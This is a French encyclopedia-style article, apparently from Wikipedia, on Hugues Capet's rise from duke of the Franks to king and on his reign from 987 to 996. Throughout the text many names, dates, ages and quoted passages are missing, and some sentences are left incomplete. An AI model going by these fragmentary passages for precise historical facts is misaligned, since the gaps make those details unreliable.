À partir de 962, l'Occident est désormais dominé par le vainqueur de la chrétienté face aux Hongrois, , qui restaure le titre impérial et s'empare au passage de l'Italie. Le nouvel empereur accroît son influence sur la Francie occidentale en portant son attraction sur certains évêchés frontaliers ; bien qu'élu de Lothaire, l'archevêque de Reims (qui assure le choix des rois de Francie) Adalbéron de Reims tend à afficher ses sympathies impériales. Pris en étau, le roi Lothaire s'appuie sur d'autres évêchés (Langres, Châlons, Noyon) et sur le comte de Flandre .
Hugues Capet, duc des Francs (960-987).
Des débuts difficiles.
Lorsqu'il reçoit sa charge ducale (duc des Francs, "dux francorum") en 960, Hugues Capet est moins puissant que son père (). En effet, il est jeune, politiquement inexpérimenté et, surtout, il est mis sous tutelle par son oncle Brunon de Cologne, proche du pouvoir ottonien.
Conséquence de cet affaiblissement, une forte poussée d'indépendance se produit chez les vassaux entre Seine et Loire. Le comte Thibaud de Blois, pourtant un ancien fidèle de Hugues le Grand qui lui a confié la cité de Laon, s'assure une quasi-indépendance en se proclamant comte de Blois, en faisant fortifier ses principales villes et en s'emparant de Chartres et de Châteaudun.
Les diplômes royaux des montrent que les grands aristocrates ne sont plus uniquement fidèles au duc des Francs, comme au temps de Hugues le Grand, mais également au roi Lothaire. En effet, on retrouve certains d'entre eux dans les armées royales luttant contre le duché de Normandie pour le compte de Lothaire. Enfin, il semblerait pour Hugues que sa place de numéro deux du royaume ait tendance à lui échapper. Deux chartes de l'abbaye de Montierender (968 et 980) font référence à , alors comte de Château-Thierry, de Vitry et abbé laïc de Saint-Médard de Soissons, portant le titre de « comte des Francs » et même de « comte du palais » dans une charte de Lothaire.
Le créateur de la royauté carolingienne.
De son côté, Lothaire a aussi perdu du pouvoir face au renforcement de la monarchie ottonienne. Il fait pâle figure en participant au rassemblement des vassaux et parents d' en 965. Pourtant, à partir de la mort de l'empereur en 973, le roi veut renouer avec la politique de son grand-père : récupérer la Lorraine, « berceau des Carolingiens ». Durant l'été 978, pour des raisons obscures, il décide de passer à l'action. Le principal témoin du temps, Richer de Reims explique :
En août 978, accompagné des grands du royaume (dont le duc Hugues qui voit d'un bon œil une brouille entre Carolingiens et Ottoniens), Lothaire pille par surprise Aix-la-Chapelle, résidence d', et se permet le geste symbolique de retourner vers l'est l'aigle de bronze décorant la tour du palais. Cet aigle, symboliquement tourné vers l'est du temps de Charlemagne, menaçait ainsi les Slaves de Moravie, mais il avait été tourné vers l'ouest par les Ottoniens, défiant ainsi la Francie occidentale. Toutefois, Lothaire doit rapidement battre en retraite et se réfugier à Étampes chez Hugues. s'engage à son tour dans l'offensive et conduit ses armées jusqu'aux portes de Paris. Charles de Lorraine, frère de Lothaire, est même couronné roi à Laon par l'évêque de Metz, . Mais, devant Paris, Hugues Capet barre la route à l'empereur germanique qui, voyant l'hiver approcher (on était le ) est contraint de s'enfuir. Les troupes de Lothaire et de Hugues Capet poursuivent Otton dont l'arrière-garde, ne pouvant franchir l'Aisne en crue à Soissons, est anéantie, « ainsi il en mourut plus par l'onde que par l'épée ». Cette victoire permet à Hugues Capet de retrouver sa place de premier aristocrate du royaume franc.
Le rôle de l'archevêché de Reims.
Jusqu'à la fin du , situé en terre carolingienne, Reims est le plus important des sièges archiépiscopaux de France. Il prétend à la primatie des Gaules et son titulaire a le privilège de sacrer les rois et de diriger leur chancellerie. De ce fait, l'archevêché rémois est traditionnellement favorable à la famille régnante et a, depuis longtemps, un rôle central dans la politique royale. Mais la cité épiscopale est dirigée par Adalbéron de Reims, neveu de Adalbéron de Metz (un prélat fidèle aux Carolingiens), élu par le roi Lothaire en 969, mais qui a des liens familiaux avec les Ottoniens. L'archevêque est assisté par un des esprits les plus avancés de son temps, l'écolâtre et futur pape Gerbert d'Aurillac. Adalbéron et Gerbert œuvrent pour le rétablissement d'un empire unique dominant toute l'Europe. Le roi Lothaire, âgé de , est de fait sous tutelle de son oncle . Mais, en grandissant, il s'affirme et prend de l'indépendance, ce qui contrecarre les projets impériaux de réunir toute l'Europe sous une unique couronne. Dès lors, l'évêché lâche Lothaire et soutient Hugues Capet.
En effet, pour que les Ottoniens puissent faire de la Francie un État vassal de l'empire, il faut impérativement que le roi des Francs ne soit pas de race carolingienne et qu'il soit suffisamment peu puissant et effacé pour accepter cette mise sous tutelle. Hugues Capet devient pour eux le candidat idéal, d'autant qu'il soutient activement la réforme monastique dans ses abbayes quand les autres prétendants continuent à distribuer des charges ecclésiales et abbatiales à leur clientèle. Une telle conduite ne pouvait que séduire les Rémois, très proches du mouvement clunisien.
Grâce à la correspondance de Gerbert, de nombreuses informations sur ces évolutions politiques ont pu être obtenues :
Les Rémois voient également d'un mauvais œil le rapprochement entre le roi et Herbert de Vermandois, l'éternel ennemi des Carolingiens, le descendant du traître qui avait permis l'arrestation de son grand-père Charles le Simple en 923. Enfin, Adalbéron et Gerbert sont tous les deux proches de la cour ottonienne et se rapprocher de Hugues serait finalement faire renoncer la Lorraine à la Francie. Enfin, a trois ans quand son père meurt : deux partis luttent alors pour assurer la régence, l'un emmené par , dit "le Querelleur" et Lothaire (954-986), l'autre par les impératrices Théophano, sa mère, et Adélaïde de Bourgogne, sa grand-mère, camp adopté par Gerbert et Adalbéron qui soutiennent donc Hugues Capet contre Lothaire.
L'échec de Lothaire (979-986).
La fin du , riche d'événements complexes, n'est éclairée que par l’"Histoire" de Richer de Reims qu'il écrit après 990. Il complète la chronologie de Flodoard de Reims qui s'arrête en 966. Cependant, son récit manque de fiabilité. Richer a le désir de bien faire, ce qui l'amène parfois à modifier la chronologie et à favoriser ses maîtres rémois : Adalbéron et Gerbert. Voilà sur quelles bases la chute des Carolingiens est connue.
Appuyé par l'évêché de Reims, Hugues est désormais le nouvel homme fort du royaume. En 979, alors que Lothaire souhaite assurer sa succession en associant au trône son fils aîné, c'est le duc des Francs qui prend en charge la réunion des "principes regnorum", c'est-à-dire les grands du royaume. La cérémonie se déroule à Compiègne en présence du roi, d'Arnoul (un fils illégitime du roi Lothaire), d'Adalbéron de Reims sous la bénédiction de Hugues. L'assemblée acclame , selon le rite carolingien, et l'archevêque de Reims le sacre roi des Francs.
L'année suivante, Lothaire, voyant grandir l'emprise de Hugues, décide de se réconcilier avec : il accepte de renoncer définitivement à la Lorraine. Mais Hugues, pour des raisons obscures, ne souhaite pas que Lothaire se réconcilie avec l'empereur germanique ; il s'empresse donc de prendre le "castrum" (la forteresse) de Montreuil, puis de partir pour Rome. Sur place, il rencontre l'empereur et le pape, en compagnie de ses fidèles Bouchard de Vendôme et Arnoul d'Orléans. La tension monte entre Lothaire et Hugues. Le roi des Francs fait marier son fils Louis à Adélaïde d'Anjou qui lui apporte l'Auvergne et le comté de Toulouse, de quoi prendre en tenaille les territoires du robertien par le sud (982). C'est un échec. Le couple se sépare deux ans plus tard.
À la suite de la mort d' (983) et profitant du jeune âge d', Lothaire renonce à son rapprochement avec les Ottoniens et, s'alliant au duc de Bavière, il décide de reprendre l'offensive en Lorraine en . Hugues se garde bien cette fois-ci d'être de l'expédition.
Lorsque le roi prend Verdun et fait prisonnier Godefroy (le frère de l'archevêque de Reims), Adalbéron et Gerbert demandent l'aide du duc des Francs. Mais la course folle de Lothaire s'achève puisqu'il meurt à son tour en .
Élu et sacré roi des Francs (987).
La fin des Carolingiens.
La contradiction de certains faits donnés par Richer ne nous permet pas de comprendre toute l'action politique de Hugues à la veille de son couronnement. Par exemple, on ne sait pas pourquoi il ne s'est pas opposé à l'association au trône de Louis, ni à sa succession en 986, alors qu'il s'est rendu à Rome pour rencontrer l'empereur germanique dans une intention hostile à Lothaire. Il semblerait que le duc des Francs, inquiet de la prise de Verdun et de l'appel d'Adalbéron, avait lui-même rassemblé une armée. Peut-être envisageait-il de marcher contre Lothaire et de s'emparer du trône ?
Dans tous les cas, le nouveau souverain , comme l'avaient fait et Lothaire, déclare qu'il prendrait les conseils du duc des Francs pour sa politique. Or, il reprend les visées de son père sur la Lorraine et il est possible qu'il aurait souhaité lancer une offensive contre Reims et Laon du fait de leur rapprochement avec l'Empire. On ne sait pas quel est le rôle de Hugues à ce moment-là, les sources restent vagues. Probablement, le duc des Francs aurait modéré les intentions exagérées du roi carolingien. De fait, Louis convoque l'archevêque de Reims à son palais de Compiègne pour qu'il réponde de ses agissements. Mais, au cours d'une partie de chasse, le roi trouve la mort dans une chute de cheval le en forêt de Senlis.
L'éviction de Charles de Lorraine.
En , les chroniqueurs, notamment Richer de Reims et Gerbert d'Aurillac, écrivent que, à Senlis, « s'éteignit la race des Charles ». Le roi défunt est aussitôt enterré à Saint-Corneille de Compiègne et non à Reims comme il le souhaitait. Or, même si est mort sans enfant, il reste un Carolingien susceptible de monter sur le trône. Il s'agit de Charles de Lorraine, fils de et frère de Lothaire. Cela n’a rien d'extraordinaire : ce n'est pas la première fois qu'un Carolingien est en concurrence avec un Robertien. En fait, au temps du père de Hugues Capet, on ne concevait pas de rompre avec les Carolingiens tant qu’il en existerait, et le prince Louis était perçu comme jeune et pur. En 987, les temps ont changé. Depuis une dizaine d'années, Hugues Capet concurrence ouvertement le roi, il semble avoir soumis les grands vassaux, mais, surtout, son adversaire Charles de Lorraine est accusé de tous les maux : il a voulu usurper la couronne (978), il est l'allié d' puis il a accusé d'adultère la reine Emma d'Italie, femme de son frère. Adalbéron de Reims convoque les plus hauts seigneurs de la Francie à Senlis et leur dit :
De retour d'Angleterre, Abbon de Fleury, écolâtre de Saint-Benoît-sur-Loire, établit une légende selon laquelle les derniers Carolingiens auraient été maudits par le « Loup » ("Passion de saint Edmund", 987). En effet, tout en insistant sur la sainteté de la tête royale due au sacre, il rappelle que le loup avait précipité et sa descendance, trop orgueilleux et brutaux à la différence du roi Edmund, souverain idéal et pacifique. Le clerc répand ainsi l'idée que les Carolingiens étaient comme condamnés par un jugement de Dieu que la contagion rendait héréditaire (, ). Il s'agit donc de bannir cette dynastie du trône. Adalbéron plaide une dernière fois en faveur de Hugues :
Où et quand Hugues Capet a-t-il été sacré roi des Francs ?
Hugues fait immédiatement acquitter Adalbéron. Ce dernier peut alors convoquer une nouvelle assemblée à Senlis (fief de Hugues) et retourne à Reims écarter toute proposition de la part de Charles de Lorraine. C'est bien Hugues qui va devenir le nouveau souverain. En revanche, les historiens spécialistes de la période affirment qu' À ces incertitudes s'ajoute le problème posé par la chronologie fournie par Richer de Reims. Le moine écrit qu'Hugues est couronné et sacré le . Yves Sassier n'imagine pas qu'on puisse à l'époque sacrer le nouveau souverain dix jours seulement après la mort du Carolingien. Il semble plutôt qu'Hugues ait été acclamé roi par l'assemblée de Senlis (le ) puis couronné et sacré roi le à Noyon. Selon une autre version, le premier couronnement de Hugues aurait eu lieu à Noyon, et le second à Paris.
Mais les sources font également mention d'une cérémonie à Reims, d'où l'idée émise de deux cérémonies : une à Noyon (laïque) et l'autre à Reims (religieuse). Finalement, de quoi est-on sûr ? Hugues Capet a été acclamé par l'assemblée de Senlis (quelques jours après la mort de ), puis il a été couronné et sacré, soit à Reims, soit à Noyon, entre mi-juin et mi-juillet de l'. Le choix de Noyon reste obscur : pourquoi avoir choisi une cité autre que Reims alors que le nouveau souverain venait d'être élu avec l'appui d'Adalbéron de Reims ? S'agit-il d'une manœuvre afin de contrer l'archevêque de Reims comme Hugues le fera quelques mois plus tard en faisant sacrer son fils à Orléans ? On ne sait rien du déroulement du sacre et du couronnement de Hugues ; en revanche il est à peu près certain qu'il portait un manteau de pourpre tissé d'or (et peut-être brodé de sujets pieux), des bas rouges, des chaussures violettes, une couronne à arche ornée de quatre fleurons et un sceptre.
Règne.
Robert le Pieux, associé à la couronne.
Un des premiers soucis du nouveau roi couronné ("") est d'assurer la perpétuation d'une dynastie. Il essaye de convaincre Adalbéron de sacrer son fils Robert. Mais l'archevêque, très proche du pouvoir ottonien qui préfère l'alternance des grandes familles sur le trône de Francie plutôt qu'une puissante dynastie capable de lui faire concurrence, refuse. Hugues, venant de recevoir une lettre de , comte de Barcelone, lui demandant de le soutenir contre Al-Mansur qui vient de razzier Barcelone, fait valoir qu'il a besoin d'avoir un successeur au cas où l'expédition contre les Sarrasins tournerait mal. Adalbéron doit céder et Robert le Pieux est sacré, âgé d'une quinzaine d'années, le jour de .
Hugues Capet rêve de le marier à une princesse byzantine, mais ce projet échouant, Robert doit épouser la veuve d', comte de Flandre, et fille de , roi d'Italie, membre de la famille carolingienne. Rozala d'Italie est de vingt ans son aînée. N'ayant pas réussi à avoir d'enfant avec elle parce qu'elle était trop âgée, Robert la répudie vers 991/992.
Associé à la couronne ("", « roi désigné »), Robert assiste son père pour les questions militaires (conquête de Laon 988-991). D'autre part, sa solide instruction assurée par Gerbert d'Aurillac à Reims, lui permet de traiter des questions religieuses dont il est rapidement le garant (il dirige le concile de Verzy en 991 et celui de Chelles en 994). Il est presque certain que, contrairement à son fils, Hugues est illettré et ne parle pas le latin mais le roman (latin vulgaire du Nord).
Capture de Charles de Lorraine.
Durant son règne, Hugues doit faire face à de nombreux opposants. En premier lieu, un de ses grands rivaux : Charles de Lorraine. Ce dernier réapparaît en 988 lorsqu'il s'empare de la ville de Laon, un des derniers bastions carolingiens. Pour se faire respecter, le roi assiège par deux fois la ville sans résultat. Préoccupé par cet échec, Hugues contacte plusieurs souverains afin d'obtenir leur aide. Nous avons connaissance d'une lettre rédigée en , sous la plume de Gerbert, dans laquelle le premier capétien ne se contente pas d'informer l'impératrice Théophano (régente de son fils ) des actions de Charles de Lorraine. En effet, il lui propose une rencontre :
Toutefois, il semble que Théophano, étant à Meersburg (près du lac de Constance) au cours du mois d'août, ne se soit pas déplacée. Alors, Hugues décide de ruser.
Après la mort d'Adalbéron de Reims (989), il décide d'élire comme nouvel archevêque le carolingien Arnoul (un fils illégitime du roi Lothaire) plutôt que Gerbert. On pense qu'il s'agit d'apaiser les partisans du Carolingien, mais la situation se retourne contre le roi puisque Arnoul livre Reims à Charles. Les alliances se forment alors ; la guerre est ouverte : Charles est allié à l'archevêque de Reims et à Herbert de Vermandois, et Hugues reçoit le soutien d'Eudes de Blois en échange de Dreux. Quant au pape, il est sollicité par les deux adversaires, tandis que la cour d' reste neutre, malgré les demandes de Hugues. La situation se débloque par la trahison d'Adalbéron, évêque de Laon, qui s'empare de Charles et d'Arnoul pendant leur sommeil et les livre au roi (991). Pour parvenir à ses fins, Adalbéron s'est fait recevoir à Laon en faisant croire à Charles et Arnoul qu'il voulait se réconcilier avec eux afin de récupérer son évêché. Bien accueilli à Laon, il jure sur le pain et le vin (le jour du Dimanche des Rameaux 29 mars ou le jour du Jeudi saint ) de conserver sa foi à Charles, avant d'ouvrir les portes de la ville à l'ennemi durant la nuit ! Le dernier Carolingien est emprisonné à Orléans, et meurt à une date inconnue.
Cette trahison, qui survient en plein mouvement de la Paix de Dieu (le concile de Charroux date de 989), frappe vivement les imaginations dans la moitié sud du royaume : Adalbéron de Laon est totalement discrédité dans ces provinces et l'image de Hugues Capet est ternie. La guerre impitoyable menée contre Charles de Lorraine pour Laon et Reims (988-991), connue par le récit de Richer de Reims et les lettres de Gerbert, ont rendu le roi hostile aux yeux d'une partie de l'Église. La vision que nous avons de la politique du Capétien est exclusivement celle des religieux, d'où le recul à prendre vis-à-vis du jugement à donner sur Hugues Capet. Les intérêts des uns et des autres, portés par des familles différentes, ne sont pas convergents. Des rivalités se font jour et les conflits entre princes sont relayés par leurs alliés religieux respectifs. Adémar de Chabannes nous donne une vision presque « manichéenne » du règne de Hugues Capet. Le même auteur nous fournit à la fois un portrait négatif et positif du souverain. C'est lui qui nous conte l'histoire d'un défi du comte Audebert à l'égard de Hugues et Robert ().
Pendant longtemps, on a affirmé que les sujets méridionaux avaient systématiquement rejeté le premier Capétien. Récemment, des études ont émis des nuances. Il semblerait que le rejet soit plutôt d'ordre politique (la capture de Charles de Lorraine) plutôt que dynastique. En effet, le duc d'Aquitaine refuse de se soumettre à son roi, ' et l'évêque de Laon est comparé à Judas le « "traître" ». Finalement, ils font la paix sur les bords de la Loire. Cette remarque est encore plus explicite dans la cité de Limoges. Les actes affirment que, jusqu'en 988, on reconnaît Hugues et même l'association de Robert puisqu'on les date de leur règne ' (). Mais cela ne dure pas, quelques mois plus tard, les chartes ne sont plus datées des règnes : il semblerait que le changement soit dû à la prise de connaissance de l'affaire de la capture de Charles de Lorraine et de la trahison de Adalbéron de Laon. Une fois mises au courant, les cités méridionales auraient rejeté la légitimité de Hugues et de Robert.
Concile de Saint-Basle de Verzy.
Arnoul, qui a trahi le roi pour ouvrir les portes de son archevêché de Reims à son oncle Charles de Lorraine, dernier prétendant carolingien possible, est soutenu par le Saint-Siège. Hugues le fait juger au concile de Saint-Basle-de-Verzy (18 et ). L'assemblée est composée de treize évêques (ce qui est peu) et présidée par l'archevêque de Sens, Séguin, peu favorable au roi. En revanche, les débats sont soutenus par l'évêque Arnoul d'Orléans, un proche du roi. Responsable de la défense, Abbon de Fleury avance que le souverain ne peut convoquer de concile et que seul le pape est compétent pour juger l'affaire. Arnoul d'Orléans lui réplique par un très violent réquisitoire contre le Saint-Siège. Arnoul est déposé. Quelques jours plus tard, Gerbert d'Aurillac est nommé archevêque de Reims.
Le pape n'accepte pas cette procédure et veut convoquer un nouveau concile à Aix-la-Chapelle, mais les évêques de Francie refusent et confirment leur décision à Chelles (hiver 993-994). Gerbert, soutenu par d'autres évêques, prend position pour l'indépendance des Églises vis-à-vis de Rome (qui est contrôlée par les empereurs germaniques). Afin d'éviter une excommunication des évêques ayant siégé au concile de Sainte-Basle, et donc un schisme, Gerbert préfère lâcher prise. Il abandonne l'archevêché et se rend en Italie. Toute l'habileté politique de Hugues Capet consiste, dès le début de l'affaire, à demander le soutien de l'empereur et du pape (qu'il n'obtient évidemment pas), et utiliser les divisions de l'Église pour mettre en première ligne les évêques francs qu'il émancipe en échange de leur soutien. L'usage de la voie conciliaire est donc un moyen habile de contrer l'influence de l'empereur, sans entrer directement en conflit.
En parallèle, Abbon de Fleury, qui avait vigoureusement défendu Arnoul, écrit qu'à partir du règne de Hugues Capet, la théorie de la royauté forgée par Hincmar de Reims est reprise : le roi règne avec les conseils des ecclésiastiques. Lui et ses contemporains, pour des raisons obscures et totalement opposées au jugement précédent, affichent à partir de ce moment un grand intérêt pour la royauté. Abbon rappelle qu'il faut être fidèle au roi et que chacun des grands seigneurs ne se trouve finalement être qu'un dépositaire du service dû au roi.
Oubliée sous les derniers Carolingiens, l'image du « roi idéal » fait son apparition : , ajoute Abbon. Il semble que, sur ce point, Hugues, pour redorer son blason aux yeux des évêques (en construisant des bâtiments religieux par exemple), ait dû légitimer ses actions contre les Carolingiens :
Abbon entend sauvegarder pour l'avenir la mémoire capétienne qui reste encore fragile dans les mentalités du . Sous Hugues Capet et encore chez , le souverain est largement conseillé et entouré par les évêques dans la tradition carolingienne.
L'insoumission des grands féodaux.
Les historiens (notamment Ferdinand Lot ou Jean-François Lemarignier) ont longtemps écrit qu'Hugues était un souverain très faible durant le règne duquel les châtelains avaient remplacé les princes familiers du palais et que la Paix de Dieu avait été décidée pour contrecarrer un rayonnement royal insuffisant. Encore une fois, les études récentes ont nuancé ces propos trop négatifs. En 987, les contemporains ont dû avoir des doutes tant on craignait la remise en cause de l'ordre carolingien. Certains ont montré ouvertement leur hostilité (Charles de Lorraine, Eudes de Blois) et d'autres (surtout les ecclésiastiques) ont préféré patienter. On a vu qu'il y a encore, sous le règne de Hugues, des habitudes carolingiennes.
Les Catalans sont souvent montrés comme étant les premiers à avoir rejeté la légitimité de Hugues. Arraché aux musulmans par les Carolingiens, le comté de Barcelone a longtemps vénéré ces derniers. Pourtant, le premier capétien ne rend pas visite aux abbayes méridionales, et donc ces dernières ne font plus appel à lui pour confirmer leurs privilèges : il y a plutôt éloignement que rupture. En outre, Michel Zimmermann a montré que la rupture entre la couronne de Francie et la Catalogne n'est pas nouvelle : « Depuis Charles le Simple et les derniers Carolingiens, on assiste à un manque d'empressement des souverains à réclamer la prestation de fidélité devant leur incapacité à fournir la protection en contrepartie. » Les comtes de Barcelone renoncent donc, après 900, à faire le voyage pour l'hommage royal. On comprend désormais pourquoi la Catalogne refuse l'exigence de Hugues en . Entre-temps, Barcelone a été assiégée en 985 par Al-Mansur. Le comte fait appel à son protecteur le roi des Francs, mais Lothaire meurt au cours de l'année 986 et a un règne trop bref pour préparer une expédition. Au lendemain de l'avènement de Hugues Capet, Borrell renouvelle son appel et Hugues promet son aide en échange d'un hommage en Aquitaine, en vain.
Enfin, Hugues doit faire face, durant tout son règne, à l'opposition d'Eudes de Blois dont les possessions prennent en tenaille le domaine royal.
Au printemps 991, le comte de Blois s'assure de la prise de Melun, alors tenue par Bouchard de Vendôme, en soudoyant le châtelain et les "milites" (chevaliers) du château. À la suite de ce coup de force, une coalition se forme entre le roi, le comte d'Anjou et le duc de Normandie : Melun est reprise dès l'été et Eudes bat en retraite. Ce dernier reprend les armes et prend Nantes, aussitôt reprise par le comte d'Anjou Foulques Nerra.
Au printemps 993, le comte de Blois, déçu qu'Hugues Capet et son fils aient refusé de lui conférer le titre de duc des Francs, imagina, en liaison avec Adalbéron de Laon de les faire capturer lors d'une rencontre projetée à Metz avec l'empereur et de placer Louis, fils du duc Charles de Basse-Lotharingie, sur le trône. de Blois serait devenu duc des Francs et Adalbéron évêque de Reims. Hugues Capet et son fils, prévenus, firent échouer cette tentative.
Inquiets de la puissance de l'Angevin, de Normandie, Eudes de Blois et de Flandre s'allient contre lui (995-996). Le conflit sans fin est interrompu par la mort d'Eudes en , puis par celle de Hugues Capet vers la fin octobre de la même année.
Fin de règne.
Eudes de Blois meurt en , laisse une veuve dont est épris Robert le Pieux. Hugues Capet refuse cette union qui apporterait la Bourgogne à son fils, car Berthe de Bourgogne est sa cousine au troisième degré, et le mariage serait consanguin.
Durant l'été 996, déjà malade, Hugues se serait rendu avec son fidèle Bouchard au monastère de Souvigny où repose son ami saint Mayeul (mort en 994).
Il n'est plus en guerre contre Eudes de Blois et a environ quand il meurt durant les neuf Calendes de l'an 996. Il « disparaît » après avoir surmonté sans gloire les difficultés que lui créèrent ses ennemis.
Le roi était peut-être atteint de la variole ; Richer témoigne : « Hugues, qui avait le corps tout couvert de pustules, s'éteignit dans son château nommé "Judéis", « Les Juifs ». Ce toponyme se réfère à un hameau aujourd'hui disparu, près de Chartres, au cœur de la Beauce.
Sépulture.
Le roi défunt est sitôt transporté à l'abbaye de Saint-Denis où il est inhumé devant l'autel de la Sainte-Trinité aux côtés du roi Eudes, son illustre grand-oncle.
En 1263, le roi Saint Louis décida d'un programme visant à réaliser des monuments funéraires pour marquer le rôle de nécropole royale dévolue à l'abbaye. Il commanda une série de quatorze mausolées ornés de gisants pour recouvrir les restes des derniers carolingiens ainsi que les premiers capétiens. Parmi les tombeaux commandés figuraient ceux d'Eudes et Hugues Capet. Ceux-ci se trouvaient à la croisée du transept à côté de l'autel matutinal et derrière les tombeaux de et de Constance d'Arles.
En août 1793, ils furent parmi les premiers tombeaux détruits par ordre de la Convention à l'instigation de Bertrand Barère. Les deux gisants disparurent en même temps que celui du roi . De ces tombeaux subsiste un dessin de l'historien et collectionneur François Roger de Gaignières, conservé à la Bibliothèque nationale de France.
Le royaume de Hugues Capet.
Les principautés territoriales.
Hugues Capet, comme ses prédécesseurs, se fait appeler "« rex Francorum »" (roi des Francs) et non pas « roi de France », ce qui signifie qu'il se sent plutôt le souverain d'un peuple, les Francs (les hommes libres), que d'un territoire. Ces liens ne reposent pas sur une présence physique qui ferait connaître le roi dans l'ensemble du royaume. Il est même possible que le premier Capétien se désintéresse progressivement du sud du royaume puisque les abbayes ne font plus appel à lui pour la confirmation de leurs biens. S'il est connu au nord de la Loire, cela est moins vrai dans les régions méridionales, comme le confirme le récit d'Abbon de Fleury de son voyage en Gascogne :
En effet, depuis le milieu du , les comtés créés au temps des Carolingiens sont devenus progressivement indépendants en exploitant la faiblesse du pouvoir royal. Les plus puissants d'entre eux se trouvent aux marges du royaume () :
Les possessions du roi.
Les historiens se sont longtemps demandé pourquoi Hugues n'avait récupéré, à la suite de son couronnement, qu'un minuscule territoire qui allait constituer le domaine royal. Il semblerait que son élection eût été plus une reconnaissance affective qu'une reconnaissance de sa puissance vis-à-vis des grands seigneurs. En effet, ses plus proches voisins (duc de Normandie ou comte d'Anjou) sont plus riches que lui en terres et en hommes. Les possessions du nouveau roi sont réduites à des morceaux de l'ancien duché robertien, consolidé jadis par son père. Ces amputations ne sont absolument pas l'objet de pertes territoriales liées à la réclamation d'un frère cadet du roi.
Ce territoire est dominé par deux grandes villes, Paris et Orléans, puis par quelques villes moyennes, Étampes, Melun, Corbeil, Dreux et Senlis. Ces places fortes sont en réalité des chefs-lieux de "pagi" au sein desquels le roi n'exerce que le pouvoir comtal. Dans chacune de ces villes, Hugues Capet dispose d'un palais, d'une troupe de chevaliers et de revenus fonciers et économiques. Chacune de ses possessions est disjointe des autres puisque de gênants vassaux (Montmorency, Montlhéry…) sont venus s'y intercaler.
Enfin, le premier capétien dispose aussi d'abbayes qui restent de puissants appuis économiques et stratégiques : Saint-Martin à Tours, Saint-Benoît-sur-Loire (Abbaye de Fleury), Saint-Maur-des-Fossés, Saint-Germain-des-Prés et Saint-Denis. Il ne reste quasiment rien du domaine carolingien, si ce n'est autour de Laon. Il serait cependant illusoire de borner le rayonnement de Hugues Capet à son seul domaine royal. Son influence s'étend sur une région beaucoup plus vaste d'Orléans à Amiens ().
L'administration au temps de Hugues Capet.
Comme on l'a dit, nous sommes assez mal renseignés sur le règne de Hugues Capet. On n'a conservé qu'un petit nombre d'actes émis par sa chancellerie : à peine une douzaine. C'est infime comparé aux plusieurs centaines de son contemporain .
La continuité carolingienne.
Hugues Capet apparaît comme un souverain qui reste très « carolingien » dans certains de ses comportements. Dans un premier temps, il associe son fils unique, Robert, à la couronne. Le prince, âgé d'environ , est acclamé puis sacré en la cathédrale d'Orléans par Adalbéron de Reims, le soir de . Cette pratique était déjà usitée au temps des Carolingiens, mais le passé a montré que cette précaution n'empêchait pas l'élection d'un autre roi ( en 922). De plus, Charles de Lorraine est toujours sur le devant de la scène et le roi a quelque peine à convaincre l'archevêque de Reims de le soutenir. Ce dernier, dont le rôle est capital pour légitimer le sacre, ne souhaite pas voir la nouvelle dynastie se renforcer précipitamment. Mais, face à l'argument de Hugues, qui affirme ne pas pouvoir laisser le royaume sans chef et sans succession assurée dans un univers hostile (les vassaux ennemis du roi, les Musulmans), l'archevêque doit céder.
Plus curieusement, on assiste au maintien par le roi lui-même et par son entourage d'une tradition impériale de la monarchie franque. Ainsi, une charte royale de Hugues Capet, datée de 992, le présente lui-même et son fils se déclarant « détenteurs du pouvoir sur l'Empire des Francs » ("imperii Francorum" (…) "potiti"). Un autre souvenir franc est la confection d'un manteau royal sur ordre de la reine Adélaïde, confié à la garde de Saint-Denis. Ce vêtement, appelé "orbis terrarum", symbolise le monde. C'est un manteau impérial et sa signification est claire : . Jusqu'en 988, tous les actes royaux du premier capétien suivent une pratique carolingienne selon laquelle la signature (souscription) est réalisée à la fois par la chancellerie et par le roi, qui y appose les signes royaux : son monogramme (modèle carolingien) et le sceau. Après cette date, encore un acte sur deux (connu) se fera de cette manière.
Enfin, le rétrécissement, tant décrié par certains historiens, des relations par actes au temps des premiers capétiens, est peu net. Sous les Carolingiens, les diplômes royaux sont rares en Normandie, Anjou, Poitou, Berry et Auvergne, et même inexistants en Gascogne, Bordelais et Toulousain. Au temps de Hugues Capet, on envoie moins de documents en Flandre et en Auvergne, mais on note une multiplication des actes vers la Normandie, la Touraine et le Berry. Il n'y a donc pas une véritable coupure avec les expéditions carolingiennes (excepté dans l'extrême sud). Bref, Richer présente le roi Hugues comme un « roi guerrier » qui accomplit des exploits avec son armée. Pour être un vrai Carolingien, il ne lui manque que le sang de Charlemagne !
La rupture capétienne.
Jusqu'en 987, les clercs ne produisent plus de grands textes. Les règnes des derniers Carolingiens ne stimulent pas les penseurs et semblent mettre de côté les hommes d'Église. Avec Hugues Capet, la situation semble changer. Dans un de ses diplômes, le roi apparaît comme l'intermédiaire entre les clercs et le peuple ("mediator cleri et plebis"). D'ailleurs, Abbon de Fleury et Richer de Reims sont conscients du changement avec l'ancienne dynastie. Le moine de Reims ajoute qu'Hugues et Robert réagissent :
Et les deux rois eux-mêmes, sous la plume de Gerbert d'Aurillac, insistent sur cette nécessité de "consilium" « ne voulant en rien abuser de la puissance royale nous décidons toutes les affaires de la "res publica" [la chose publique] en recourant aux conseils et sentences de nos fidèles ». En fait, au besoin, les évêques du Nord assistent et soutiennent le roi lors de plaids royaux ou de synodes. Mais Hugues a besoin de l'appui de l'Église pour asseoir davantage sa légitimité, et parce que les contingents de cavaliers qui composent son armée proviennent en grande partie des évêchés.
Concernant les actes royaux, on a vu que le roi n'est réellement présent que dans la région située entre l'Oise et la Seine. Les diplômes royaux peuvent être également des chartes privées comportant un grand nombre de souscriptions. Avec Hugues Capet s'ouvre une nouvelle pratique dans la rédaction des actes. Jusqu'en 987, ils faisaient uniformément l'objet, on l'a souligné, d'une signature de la chancellerie jointe à celle du roi. Dorénavant, le roi doit faire souscrire certains de ses diplômes (un seul connu pour Hugues Capet) non par le seul chancelier, mais par les personnes qui l'entourent (les grands seigneurs).
